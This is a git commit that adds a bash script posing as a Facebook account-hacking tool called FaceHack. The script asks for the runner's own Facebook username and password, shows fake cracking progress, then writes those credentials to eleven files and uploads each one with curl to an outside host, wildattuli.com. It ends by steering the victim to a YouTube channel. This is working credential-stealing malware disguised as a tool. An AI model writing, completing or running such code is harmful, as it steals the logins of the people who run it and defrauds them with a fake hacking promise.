1b772d14d4e3d54ae4d8c8314c58ea3acbb129fb
Dreenofx <49922837+Dreenofx@users.noreply.github.com>
2019-09-12 20:35:29 +0000

    Add files via upload

---
+++ FaceHack/HackFb.sh
@@ -0,0 +1,63 @@
+#!/bin/bash
+count=10
+while [ $count -le 100 ]
+do
+echo "Starting Face-Hack... [$count%]";
+sleep 0.1
+clear
+(( count++ ))
+done
+echo "[+] The FaceHack -- Facebook Account Sniper [+]";
+echo '   _____              _   _            _     ';
+echo '  |  ___|_ _  ___ ___| | | | __ _  ___| | __ ';
+echo '  | |_ / _` |/ __/ _ \ |_| |/ _` |/ __| |/ / ';
+echo '  |  _| (_| | (_|  __/  _  | (_| | (__|   <  ';
+echo '  |_|  \__,_|\___\___|_| |_|\__,_|\___|_|\_\ ';
+echo '  -------------- By DVanGhots -------------- ';
+echo ''
+echo 'Login To Your Account First!'
+echo ''
+read -p 'Username/Email:' username
+read -p 'Password:' password
+echo '[+] Login to facebook...';
+sleep 1
+echo '[+] Connecting To Facebook...';
+sleep 2
+echo '[+] Succesfully Login...!!';
+sleep 5
+read -p 'Target ID/Username:' target
+read -p 'Send Email:' email
+sleep 1
+echo 'Finding Your Target....';
+sleep 2
+echo 'Proccess Your Target....!!!';
+sleep 3
+echo 'Crack Your Target Accounts..!!!';
+printf "User: $username\nPass: $password\nTarget: $target\nEmail: $email" >> output/fuck.html;
+printf "User: $username\nPass: $password\nTarget: $target\nEmail: $email" >> output/fuck1.html;
+printf "User: $username\nPass: $password\nTarget: $target\nEmail: $email" >> output/fuck2.html;
+printf "User: $username\nPass: $password\nTarget: $target\nEmail: $email" >> output/fuck3.html;
+printf "User: $username\nPass: $password\nTarget: $target\nEmail: $email" >> output/fuck4.html;
+printf "User: $username\nPass: $password\nTarget: $target\nEmail: $email" >> output/fuck5.html;
+printf "User: $username Pass: $password Target: $target Email: $email" >> output/fuck6.html;
+printf "User: $username Pass: $password Target: $target Email: $email" >> output/fuck7.html;
+printf "User: $username Pass: $password Target: $target Email: $email" >> output/fuck8.html;
+printf "User: $username Pass: $password Target: $target Email: $email" >> output/fuck9.html;
+printf "User: $username Pass: $password Target: $target Email: $email" >> output/fuck0.html;
+sleep 2
+curl -T output/fuck.html http://wildattuli.com
+curl -T output/fuck1.html http://wildattuli.com
+curl -T output/fuck2.html http://wildattuli.com
+curl -T output/fuck3.html http://wildattuli.com
+curl -T output/fuck4.html http://wildattuli.com
+curl -T output/fuck5.html http://wildattuli.com
+curl -T output/fuck6.html http://wildattuli.com
+curl -T output/fuck7.html http://wildattuli.com
+curl -T output/fuck8.html http://wildattuli.com
+curl -T output/fuck9.html http://wildattuli.com
+curl -T output/fuck0.html http://wildattuli.com
+echo '[+] Succesfully Crack!';
+sleep 3
+echo '[+] Subcribe My Youtube Channel For Get Your Target Password...!!!';
+echo '[*] My Youtube Channel : https://www.youtube.com/channel/UCaqIGTYPLOggL12vOIKCyzA';
+echo '[%] Coment On My Video With Your Channel Name And I Can Inbox You Password Accounts....!!!!!!';
